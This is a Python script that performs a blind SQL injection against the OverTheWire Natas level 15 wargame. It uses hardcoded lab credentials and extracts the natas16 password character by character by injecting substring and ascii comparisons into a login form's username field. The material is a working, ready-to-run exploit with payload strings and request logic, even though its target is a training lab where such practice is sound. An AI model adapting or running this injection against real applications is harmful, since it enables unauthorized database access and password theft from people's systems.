import requests

found = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
url = "http://natas15.natas.labs.overthewire.org"
login = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

inject = """ " or ((select substring(password, 1, 1) from users where username = "natas16") = 2) or "1"="2"""

passlength = 32
charset = [chr(ord('a')+i) for i in range(26)] + [chr(ord('A')+i) for i in range(26)]
asciicharset = [ord('a')+i for i in range(26)] + [ord('A')+i for i in range(26)]
intset = [i for i in range(10)]
# print(charset)
# print("Bruteforcing passsword......")

for i in range(15, 32):
    session = requests.Session()
    for c in asciicharset:
        
        r1 = session.get(url, auth=login)
        query = f""" " or ((select ascii(substring(password, {i+1}, 1)) from users where username = "natas16") = {c}) or "1"="2""" 
        # print(query)
      
        r2 = session.post(f"{url}?debug=1", data={'username': query}, auth=login)
        if "This user exists." in r2.text:
            print(f"character match: {chr(c)}")
            # print(chr(c),end="")
            session.close()
            break
    for d in intset:
        r1 = session.get(url, auth=login)
        query = f""" " or ((select substring(password, {i+1}, 1) from users where username = "natas16") = "{d}") or "1"="2""" 
        # print(query)
      
        r2 = session.post(f"{url}?debug=1", data={'username': query}, auth=login)
        if "This user exists." in r2.text:
            print(f"character match: {d}")
            # print(chr(c),end="")
            session.close()
            break

    session.close()

        
